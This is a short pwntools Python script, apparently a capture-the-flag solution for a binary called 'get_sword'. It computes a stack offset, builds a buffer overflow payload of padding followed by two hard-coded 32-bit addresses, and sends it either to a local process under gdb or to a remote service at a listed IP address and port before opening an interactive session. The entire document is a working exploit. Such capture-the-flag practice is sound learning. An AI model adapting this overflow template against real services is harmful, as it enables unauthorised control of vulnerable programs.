from pwn import * 


elf = ELF('./get_sword')
context.log_level = 'DEBUG'

if args['REMOTE']:
    io = remote('173.255.201.51', 31337)
else: 
    io = process([elf.path])
    gdb.attach(io, 'b main')
    pause()

offset = (0xffffcb8c - 0xffffcb6c) * b'a'
payload = offset + p32(0x80492e0) + p32(0x08049218)

io.recv()
io.sendline(payload)
io.interactive()